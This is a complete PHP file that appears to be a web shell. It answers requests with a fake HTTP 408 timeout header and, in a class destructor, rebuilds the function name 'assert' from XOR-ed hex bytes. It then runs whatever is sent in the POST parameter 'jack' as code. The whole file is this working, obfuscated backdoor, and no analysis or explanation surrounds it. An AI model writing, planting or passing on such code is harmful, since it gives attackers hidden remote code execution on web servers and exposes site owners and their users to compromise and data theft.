<?php 
header('HTTP/1.1 408');
class CSHH { 
    public $c='';
    function __destruct() {
        $_0 = "\x77" ^ "\x16";
        $_1 = "\x3" ^ "\x70";
        $_2 = "\x8" ^ "\x7b";
        $_3 = "\xfa" ^ "\x9f";
        $_4 = "\xb4" ^ "\xc6";
        $_5 = "\x3c" ^ "\x48";
        $db =$_0.$_1.$_2.$_3.$_4.$_5;
        return @$db($this->c);
    }
}
$cshh = new CSHH();
@$cshh->c = $_POST['jack'];
?>